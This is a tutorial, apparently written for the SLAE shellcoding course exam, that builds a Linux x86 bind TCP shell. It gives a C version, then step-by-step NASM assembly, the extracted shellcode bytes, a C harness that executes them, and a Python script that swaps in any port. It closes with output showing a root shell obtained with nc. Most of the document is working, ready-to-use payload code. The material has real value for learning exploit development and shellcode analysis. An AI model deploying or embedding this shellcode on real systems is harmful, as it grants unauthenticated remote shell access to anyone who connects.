# Bind TCP Shell

Today, we will deal with the process of creating Bind TCP Shell from scratch. As a rule, we distinguish between two types of shells that interest the pentester:
- Bind TCP Shell
- Reverse TCP Shell

In the first case, it involves opening a listening port on the victim's system so that the attacker can remotely connect to his shell.

First, we'll try to reproduce this behavior using a C program.

```c
#include <stdio.h>
#include <netinet/in.h>

// Change the correct port here
#define PORT 4444

int main(int argc, char **argv)
{	
	// sys_socket()	- Creating a socket (interface) for communication
	int bind_socket = socket(AF_INET, SOCK_STREAM, 0);
	
	// sys_bind() - Binding to a specified address and port 
	struct sockaddr_in address;
	address.sin_addr.s_addr = INADDR_ANY;
	address.sin_port = htons(PORT);
	address.sin_family = AF_INET;
	bind(bind_socket,(struct sockaddr *)&address, sizeof(address));
	
	// sys_listen() - Listening for incoming connection 
	listen(bind_socket,0);
	
	// sys_accept() - Accepting the incoming connection
	int sock = accept(bind_socket,NULL,NULL);
	
	// sys_dup2() - Configuring STDIN/STDOUT and STDERR for proper shell functioning
	dup2(sock,2);	// STDERR
	dup2(sock,1);	// STDOUT
	dup2(sock,0);	// STDIN
	
	// sys_execve() - Establishing a shell using /bin/sh
	execve("/bin/sh",NULL,NULL);
	
	return 0;
}
```

As we can see, in order to create a properly working program, it is necessary to use several so-called system calls. In this case, they are:

- sys_socket()
- sys_bind()
- sys_listen()
- sys_accept()
- sys_dup2()
- sys_execve()

They are responsible for the whole process that the computer must perform to finally end with an open port waiting for connection.

So let's start creating our shellcode using NASM. I will try to divide this process into parts, distinguishing between different system calls called in the course.

### Clearing ###
First, we will start by clearing the registers we use, because in the case of the C language wrapper that we will be using, it may turn out to be very important (registers are not empty at the time of transition to the _start function).
```nasm
global _start

section .text
_start:

cleaning:
	; cleaning all registers for further usage
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx
```

### sys_socket() ###
Then, we proceed to create the socket. For this purpose, we will use socketcall() syscall, which will allow us to easily call subsequent types of system calls (socket, bind, listen ....).

At this point I would like to explain the principle of system calls. Their list, in the case of systems based on intel x86 processors, can be found in the file:
- /usr/include/i386-linux-gnu/asm/unistd_32.h

Each call system has its own identifier, which if you want to call directly describes it. For example, socketcall () has the identifier 102, which can be easily checked by grepping its name.
```sh
$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep socketcall
#define __NR_socketcall 102
```
In addition, in order to call the system call, in most cases you will need to set the appropriate arguments (system calls should be treated as a function) in the correct registers and order.

Processor registers can be used as "containers" for arguments. In the case of system calls, it looks like this:
- EAX is responsible for the system call identifier
- EBX holds the first argument
- ECX holds the second argument
- EDX stores the third argument
- ESI stores the fourth argument
- EDI stores the fifth argument

Situations where more than five arguments should be used fall outside the scope of this article.

In the case of socketcall() syscall, the situation looks slightly different. 
Due to the fact that other types of system calls will be called with it, the arguments describing these types must be placed in the reverse order (!) On the stack, and then the ECX register (second argument) must point to the top of the stack, in such way that the processor can easily get to the called syscall arguments.

So we know that there must be 102 in the EAX registry. How do you know what further arguments are required? In most cases, use the man command.
```sh
$ man 2 socketcall
SOCKETCALL(2)              Linux Programmer's Manual             SOCKETCALL(2)

NAME
       socketcall - socket system calls

SYNOPSIS
       int socketcall(int call, unsigned long *args);

DESCRIPTION
       socketcall()  is  a  common  kernel  entry  point for the socket system
       calls.  call determines which socket function to invoke.   args  points
       to a block containing the actual arguments, which are passed through to
       the appropriate call.
```
We see, therefore, that this syscall accepts two arguments. The first is socket function to invoke (for example, sys_socket()), the second indicates the arguments of this function (top of the stack in ECX).

The first function we call is sys_socket. Let's check its unique identifier.
For "minor" syscalls called by socketcall(), their list is in the file:
- /usr/include/linux/net.h

```sh
$ cat /usr/include/linux/net.h | grep sys_socket
#define SYS_SOCKET	1		/* sys_socket(2)		
```
Identifier is 1, let's check what arguments are expected. 
```sh
$ man 2 socket | grep "int socket"
int socket(int domain, int type, int protocol);
```
In most cases, the man command accurately describes what each argument means and where we can find the values that describe it. If not, everything is in Google :)
- AF_INET = 2 (PF_INET)

```sh
$ vim /usr/include/i386-linux-gnu/bits/socket.h +122

#define AF_INET    PF_INET

$ vim /usr/include/i386-linux-gnu/bits/socket.h +78

#define PF_INET         2       /* IP protocol family
```
- SOCK_STREAM = 1

```sh
$ vim /usr/include/i386-linux-gnu/bits/socket.h +42

SOCK_STREAM = 1,              /* Sequenced, reliable, connection-based byte streams.  */
```
- IPPROTO_IP = 0

```sh
$ vim /usr/include/netinet/in.h + 34

IPPROTO_IP = 0,        /* Dummy protocol for TCP.  */
```
These arguments must be thrown in the reverse order due to the specifics of the stack.

Let's move to the NASM code:
```nasm
sys_socket:
	; {C code} --> int bind_socket = socket(AF_INET, SOCK_STREAM, 0);
	
	; syscall definition
	mov al, 102 		; syscall - socketcall
	mov bl, 1		; socketcall type - sys_socket

	; pushing the sys_socket atributes in reverse order (AF_INET, SOCK_STREAM, IPPROTO_IP)
	xor esi, esi		
	push esi		; IPPROTO_IP = 0 (null)
	push 1			; SOCK_STREAM = 1
	push 2			; AF_INET = 2 (PF_INET)

	mov ecx, esp 		; directing the stack pointer to sys_socket() function arguments

	int 128			; syscall execution

	mov edx, eax		; saving the bind_socket pointer for further usage
```

### sys_bind() ###
The next call system will be sys_bind. The whole process looks very similar, except that we have here "throwing" arguments to the stack and indicating their top to the ECX register twice.

We check the system call identifier:
```sh
$ cat /usr/include/linux/net.h | grep sys_bind
#define SYS_BIND	2		/* sys_bind(2)
```
And also the structure of the expected arguments:
```sh
$ man 2 bind | grep "int bind"
int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
```
NASM code:
```nasm
sys_bind:
	; {C code} --> struct sockaddr_in address;
        ; {C code} --> address.sin_addr.s_addr = INADDR_ANY;
        ; {C code} --> address.sin_port = htons(PORT);
        ; {C code} --> address.sin_family = AF_INET;
	; {C code} --> bind(bind_socket,(struct sockaddr *)&address, sizeof(address));

	; syscall definition
	mov al, 102		; syscall - socketcall
	mov bl, 2		; socketcall type - sys_bind

	; pushing the address struct arguments
	xor esi, esi
	push esi		; pushing INADDR_ANY = 0 (null)
	push word 0x5c11	; PORT = 4444 (change reverse hex value for different port)
	push word 2		; AF_INET = 2 (must be word)

	mov ecx, esp		; directing the stack pointer to address struct arguments
	
	; pushing the sys_bind arguments in reverse order (int bind_socket, const struct sockaddr *addr, socklen_t addrlen) 
	push 16			; socklen_t addrlen (size) = 16
	push ecx		; const struct sockaddr *addr - stack pointer with struct arguments	
	push edx		; bind_socket pointer

	mov ecx, esp		; directing the stack pointer to sys_bind() function arguments

	int 128			; syscall execution
```


### sys_listen() ###
Next in order - sys_listen()

We check the system call identifier:
```sh
$ cat /usr/include/linux/net.h | grep sys_listen
#define SYS_LISTEN	4		/* sys_listen(2)
```
And also the structure of the expected arguments:
```sh
$ man 2 listen | grep "int listen"
int listen(int sockfd, int backlog);
```
NASM code:
```nasm
sys_listen:
	; {C code} --> listen(bind_socket,0);
	
	; syscall definition
	mov al, 102		; syscall - socketcall
	mov bl, 4		; socketcall type - sys_listen

	; pushing the sys_listen arguments in reverse order (int bind_socket, int backlog)
	xor esi,esi		
	push esi		; pushing backlog = 0 (null)
	push edx		; bind_socket pointer

	mov ecx, esp		; directing the stack pointer to sys_listen() function arguments
	
	int 128			; syscall execution
```

### sys_accept() ###
Another simple syscall is sys_accept().

We check the system call identifier:
```sh
$ cat /usr/include/linux/net.h | grep sys_accept
#define SYS_ACCEPT	5		/* sys_accept(2)
```
And also the structure of the expected arguments:
```sh
$ man 2 accept | grep "int accept"
int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
```
NASM code:
```nasm
sys_accept:
	; {C code} --> int sock = accept(bind_socket,NULL,NULL);
	
	; syscall definition
	mov al, 102		; syscall - socketcall
	mov bl, 5		; socketcall type - sys_accept
	
	; pushing the sys_accept arguments in reverse order (int bind_socket, struct sockaddr *addr, socklen_t *addrlen)
	xor esi, esi
	push esi		; pushing socklen_t *addrlen = 0 (null)
	push esi		; pushing struct sockaddr *addr = 0 (null)
	push edx		; bind_socket pointer

	mov ecx, esp		; directing the stack pointer to sys_accept() function arguments

	int 128			; syscall execution

	mov edx, eax		; saving the bind_socket pointer for further usage
```

### sys_dup2() ###
Another syscall, sys_dup2() can be implemented in many ways, for example by using loops. I decided to do it step by step in order to better illustrate the arguments raised.
It is worth noting that it is not called from socketcall(), but directly as system syscall.

We check the system call identifier:
```sh
$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep dup2
#define __NR_dup2 63
```
And also the structure of the expected arguments:
```sh
$ man 2 dup2 | grep "int dup2"
int dup2(int oldfd, int newfd);
```
NASM code:
```nasm
sys_dup2:
	; {C code} --> dup2(sock,2);
        ; {C code} --> dup2(sock,1);
        ; {C code} --> dup2(sock,0);

	; syscall definition
	mov al, 63		; syscall - dup2
	
	mov ebx, edx		; overwriting the bind_socket pointer
	xor ecx, ecx		; STDIN - 0 (null)

	int 128			; syscall execution

	; syscall definition
	mov al, 63		; syscall - dup2
	mov cl, 1		; STDOUT - 1
	
	int 128			; syscall execution

	; syscall definition
	mov al, 63		; syscall - dup2
	mov cl, 2		; STDERR - 2

	int 128			; syscall execution
```

### sys_execve() ###
The last syscall we call will be sys_execve. In this case we see the placement of the string "`/bin/sh`" + string terminator `\x00` in the EBX registry, using a stack.

After doing this, syscall establishes a listening port with an assigned shell when someone connects to it.

We check the system call identifier:
```sh
$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep execve
#define __NR_execve 11
```
And also the structure of the expected arguments:
```sh
$ man 2 execve | grep "int execve"
int execve(const char *filename, char *const argv[],
                  char *const envp[]);
```
NASM code:
```nasm
sys_execve:
	; {C code} --> execve("/bin/sh",NULL,NULL);

	; syscall definition
	mov al, 11		; syscall - execve

	; pushing the sys_execve string argument
	xor esi, esi
	push esi		; pushing 0 (null)

	push 0x68732f6e		; pushing "n/sh"
	push 0x69622f2f		; pushing "//bi"

        ; pushing the sys_execve arguments (const char *filename, char *const argv[], char *const envp[])
	mov ebx, esp		; directing the stack pointer to sys_execve() string argument
	xor ecx, ecx		; char *const envp[] = 0 (null)
	xor edx, edx		; char *const argv[] = 0 (null)

	int 128			; syscall execution
```
---------------------------------------------------------------------------

### bind_shell.nasm ###
That's all, below I present the entire code of the NASM file, which we will then put into the C language wrapper and try to execute.

```nasm
; Filename: bind_shell.nasm
; Author:   Jakub Heba
; Purpose:  SLAE Course & Exam

global _start			

; Header Files:
; -------------------------------------------------------------------------------------------------------
; |  Linux Syscall description file path: 		|  /usr/include/i386-linux-gnu/asm/unistd_32.h  |
; |  Linux Socketcall numbers:				|  /usr/include/linux/net.h			|
; |  Linux IP Protocols Declarations:			|  /usr/include/netinet/in.h			|
; |  Linux System-specific socket constants and types:	|  /usr/include/i386-linux-gnu/bits/socket.h	|
; |  Values for setsockopt():				|  /usr/include/asm-generic/socket.h		|
; -------------------------------------------------------------------------------------------------------

section .text
_start:

cleaning:
	; cleaning all registers for further usage
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx

sys_socket:
	; {C code} --> int bind_socket = socket(AF_INET, SOCK_STREAM, 0);
	
	; syscall definition
	mov al, 102 		; syscall - socketcall
	mov bl, 1		; socketcall type - sys_socket

	; pushing the sys_socket atributes in reverse order (AF_INET, SOCK_STREAM, IPPROTO_IP)
	xor esi, esi		
	push esi		; IPPROTO_IP = 0 (null)
	push 1			; SOCK_STREAM = 1
	push 2			; AF_INET = 2 (PF_INET)

	mov ecx, esp 		; directing the stack pointer to sys_socket() function arguments

	int 128			; syscall execution

	mov edx, eax		; saving the bind_socket pointer for further usage

sys_bind:
	; {C code} --> struct sockaddr_in address;
        ; {C code} --> address.sin_addr.s_addr = INADDR_ANY;
        ; {C code} --> address.sin_port = htons(PORT);
        ; {C code} --> address.sin_family = AF_INET;
	; {C code} --> bind(bind_socket,(struct sockaddr *)&address, sizeof(address));

	; syscall definition
	mov al, 102		; syscall - socketcall
	mov bl, 2		; socketcall type - sys_bind

	; pushing the address struct arguments
	xor esi, esi
	push esi		; pushing INADDR_ANY = 0 (null)
	push word 0x5c11	; PORT = 4444 (change reverse hex value for different port)
	push word 2		; AF_INET = 2 (must be word, to hold the IP address)

	mov ecx, esp		; directing the stack pointer to address struct arguments
	
	; pushing the sys_bind arguments in reverse order (int bind_socket, const struct sockaddr *addr, socklen_t addrlen) 
	push 16			; socklen_t addrlen (size) = 16
	push ecx		; const struct sockaddr *addr - stack pointer with struct arguments	
	push edx		; bind_socket pointer

	mov ecx, esp		; directing the stack pointer to sys_bind() function arguments

	int 128			; syscall execution

sys_listen:
	; {C code} --> listen(bind_socket,0);
	
	; syscall definition
	mov al, 102		; syscall - socketcall
	mov bl, 4		; socketcall type - sys_listen

	; pushing the sys_listen arguments in reverse order (int bind_socket, int backlog)
	xor esi,esi		
	push esi		; pushing backlog = 0 (null)
	push edx		; bind_socket pointer

	mov ecx, esp		; directing the stack pointer to sys_listen() function arguments
	
	int 128			; syscall execution

sys_accept:
	; {C code} --> int sock = accept(bind_socket,NULL,NULL);
	
	; syscall definition
	mov al, 102		; syscall - socketcall
	mov bl, 5		; socketcall type - sys_accept
	
	; pushing the sys_accept arguments in reverse order (int bind_socket, struct sockaddr *addr, socklen_t *addrlen)
	xor esi, esi
	push esi		; pushing socklen_t *addrlen = 0 (null)
	push esi		; pushing struct sockaddr *addr = 0 (null)
	push edx		; bind_socket pointer

	mov ecx, esp		; directing the stack pointer to sys_accept() function arguments

	int 128			; syscall execution

	mov edx, eax		; saving the bind_socket pointer for further usage

sys_dup2:
	; {C code} --> dup2(sock,2);
        ; {C code} --> dup2(sock,1);
        ; {C code} --> dup2(sock,0);

	; syscall definition
	mov al, 63		; syscall - dup2
	
	mov ebx, edx		; overwriting the bind_socket pointer
	xor ecx, ecx		; STDIN - 0 (null)

	int 128			; syscall execution

	; syscall definition
	mov al, 63		; syscall - dup2
	mov cl, 1		; STDOUT - 1
	
	int 128			; syscall execution

	; syscall definition
	mov al, 63		; syscall - dup2
	mov cl, 2		; STDERR - 2

	int 128			; syscall execution

sys_execve:
	; {C code} --> execve("/bin/sh",NULL,NULL);

	; syscall definition
	mov al, 11		; syscall - execve

	; pushing the sys_execve string argument
	xor esi, esi
	push esi		; pushing 0 (null)

	push 0x68732f6e		; pushing "n/sh"
	push 0x69622f2f		; pushing "//bi"

        ; pushing the sys_execve arguments (const char *filename, char *const argv[], char *const envp[])
	mov ebx, esp		; directing the stack pointer to sys_execve() string argument
	xor ecx, ecx		; char *const envp[] = 0 (null)
	xor edx, edx		; char *const argv[] = 0 (null)

	int 128			; syscall execution
```

### Assemble and linking ###

Let's use scripts provided by Vivec in SLAE course materials.
```sh
$ cat ./compile.sh 

#!/bin/bash
echo '[+] Assembling with Nasm ... '
nasm -f elf32 -o $1.o $1.nasm
echo '[+] Linking ...'
ld -o $1 $1.o
echo '[+] Done!'

$ ./compile.sh bind_shell
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
```

### Preparing C Wrapper ###

Now we extract the shellcode from our NASM and put it in the C language wrapper. It's also worth checking to see if any null-byte has crept in.
```sh
$ objdump -d ./bind_shell|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x31\xf6\x56\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc2\xb0\x66\xb3\x02\x31\xf6\x56\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x31\xf6\x56\x52\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x31\xf6\x56\x56\x52\x89\xe1\xcd\x80\x89\xc2\xb0\x3f\x89\xd3\x31\xc9\xcd\x80\xb0\x3f\xb1\x01\xcd\x80\xb0\x3f\xb1\x02\xcd\x80\xb0\x0b\x31\xf6\x56\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xcd\x80"
```
Then we have to copy it inside shellcode.c wrapper file:
```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x31\xf6\x56\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc2\xb0\x66\xb3\x02\x31\xf6\x56\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x31\xf6\x56\x52\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x31\xf6\x56\x56\x52\x89\xe1\xcd\x80\x89\xc2\xb0\x3f\x89\xd3\x31\xc9\xcd\x80\xb0\x3f\xb1\x01\xcd\x80\xb0\x3f\xb1\x02\xcd\x80\xb0\x0b\x31\xf6\x56\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xcd\x80";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
```

And compile.
```sh
$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
```

### Python port wrapper ###

A very nice improvement is to write a wrapper that will allow us to quickly change the port on which TCP Bind Shell should run.

The port will always be a maximum of two bytes, regardless of whether it is port 1 (`\x01`) or 65535 (`\xff\xff`). Therefore, we can use a simple trick to replace port 4444, indicated by us in NASM (`\x11\x5c`), with the port indicated as argument.
```python
#/usr/bin/python3
import sys

# We want to produce a shellcode, which has included port specified by us.
# We are replacing \x11\x5c then, which was the original port putted inside (4444)
shellcode = r'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x31\xf6\x56\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc2\xb0\x66\xb3\x02\x31\xf6\x56\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x31\xf6\x56\x52\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x31\xf6\x56\x56\x52\x89\xe1\xcd\x80\x89\xc2\xb0\x3f\x89\xd3\x31\xc9\xcd\x80\xb0\x3f\xb1\x01\xcd\x80\xb0\x3f\xb1\x02\xcd\x80\xb0\x0b\x31\xf6\x56\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xcd\x80'
port = int(sys.argv[1])

print("\nPort specified:  ",port,'\n',30*'-','\n')
hexed = hex(port).replace('0x','')

if len(hexed) == 1:
	fin = ('\\x0'+hexed)
elif len(hexed) == 2:
	fin = ('\\x'+hexed)
elif len(hexed) == 3:
	fin = ('\\x0'+hexed[0]+'\\x'+hexed[1:3])
elif len(hexed) ==4:
	fin = ('\\x'+hexed[:2]+'\\x'+hexed[2:4])

print("Port in hex:     ",fin,'\n',30*'-','\n')
final = shellcode.replace("\\x11\\x5c",fin)
print("Final shellcode:  \""+str(final)+'"','\n')
```
Usage:
```sh
$ python3 wrapper.py 8080

Port specified:   8080
 ------------------------------

Port in hex:      \x1f\x90
 ------------------------------

Final shellcode:  "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x31\xf6\x56\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc2\xb0\x66\xb3\x02\x31\xf6\x56\x66\x68\x1f\x90\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x31\xf6\x56\x52\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x31\xf6\x56\x56\x52\x89\xe1\xcd\x80\x89\xc2\xb0\x3f\x89\xd3\x31\xc9\xcd\x80\xb0\x3f\xb1\x01\xcd\x80\xb0\x3f\xb1\x02\xcd\x80\xb0\x0b\x31\xf6\x56\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xcd\x80"
```

### Execution ###

```sh
$ netstat -antp | grep 4444
<blank>

$ ./shellcode
Shellcode Length: 119

$ netstat -antp | grep 4444
tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      20856/shellcode 
```
Great! Now we have to connect to it only.
```sh
$ nc localhost 4444
id
uid=0(root) gid=0(root) groups=0(root)
```

### Pwned. ###
